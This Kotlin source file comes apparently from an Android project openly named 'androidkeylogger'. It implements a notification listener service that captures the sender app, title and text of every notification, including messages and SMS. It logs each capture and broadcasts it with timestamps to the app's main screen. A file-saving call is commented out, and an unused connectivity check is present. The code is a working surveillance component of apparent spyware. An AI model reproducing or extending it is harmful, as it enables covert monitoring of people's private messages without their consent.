package com.azamovhudstc.androidkeylogger

import android.app.Notification
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MyNotificationListenerService : NotificationListenerService() {
    var lastNotification =""
    override fun onNotificationPosted(sbn: StatusBarNotification) {
            super.onNotificationPosted(sbn)
        val notification = sbn.notification
        val extras = notification.extras
        val title = extras.getString("android.title")
        val text = extras.getCharSequence("android.text")?.toString()
        val packageName = sbn.packageName
        val timeStamp = SimpleDateFormat("HH:mm", Locale.getDefault()).format(Date())
        val dayTime = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(Date())

        if (title != null && text != null&& lastNotification != text) {
            lastNotification= text
            Log.d("NotificationListener", "Package: $packageName, Title: $title, Text: $text")
            // Handle the received SMS or message here
            // MainActivity da updateRecyclerView ni chaqirish
            val intent = Intent("com.azamovhudstc.androidkeylogger.NOTIFICATION_LISTENER")
            intent.putExtra("packageName", packageName)
            intent.putExtra("title", title)
            intent.putExtra("text", text)
            intent.putExtra("date", timeStamp)
            intent.putExtra("dayTime", dayTime)
//            saveNotificationToFile(NotificationModel(packageName, title, text))
            sendBroadcast(intent)

        }

    }

    fun isOnline(context: Context): Boolean {
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = connectivityManager.activeNetwork ?: return false
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
            return capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) ||
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)
        } else {
            val networkInfo = connectivityManager.activeNetworkInfo ?: return false
            return networkInfo.isConnected
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        super.onNotificationRemoved(sbn)

    }
}
